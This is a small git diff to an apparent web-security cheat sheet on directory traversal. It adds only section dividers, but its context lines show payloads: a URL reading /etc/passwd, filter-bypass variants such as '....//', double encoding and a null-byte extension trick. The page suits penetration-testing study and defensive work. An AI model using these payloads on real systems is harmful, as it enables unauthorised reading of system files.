@@ -18,6 +18,8 @@ An attacker can request the following URL to retrieve the `/etc/passwd` file fro
 
 `https://insecure-website.com/loadImage?filename=../../../etc/passwd`
 
+---
+
 ## Bypass defenses
 
 * Elimination (strip): `../` -> `....//`
@@ -33,6 +35,8 @@ An attacker can request the following URL to retrieve the `/etc/passwd` file fro
 **Note**: On Windows, both `../` and `..\` are valid directory traversal sequences.
 {{< /hint >}}
 
+---
+
 ## Tips
 
 * Don't always trust error messages
@@ -42,6 +46,8 @@ An attacker can request the following URL to retrieve the `/etc/passwd` file fro
 * Combine the cases:
   * Example: `....//....//....//etc/passwd%00.jpg` (strip, double-encode, null byte, whitelist extension)
   * `%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252Fetc%252Fpasswd%252500%252Ejpg`
+
+---
 
 ## Common files
 
@@ -55,6 +61,8 @@ An attacker can request the following URL to retrieve the `/etc/passwd` file fro
 {{< hint style=tips >}}
 **Tip**: On Windows, you can also try using a different drive letter than *C:*.
 {{< /hint >}}
+
+---
 
 ## Identify Windows version
 
@@ -100,6 +108,8 @@ Alternatively, you can search the product version on Google for more information
 {{< /hint >}}
 
 
+
+---
 
 ## Automation
 
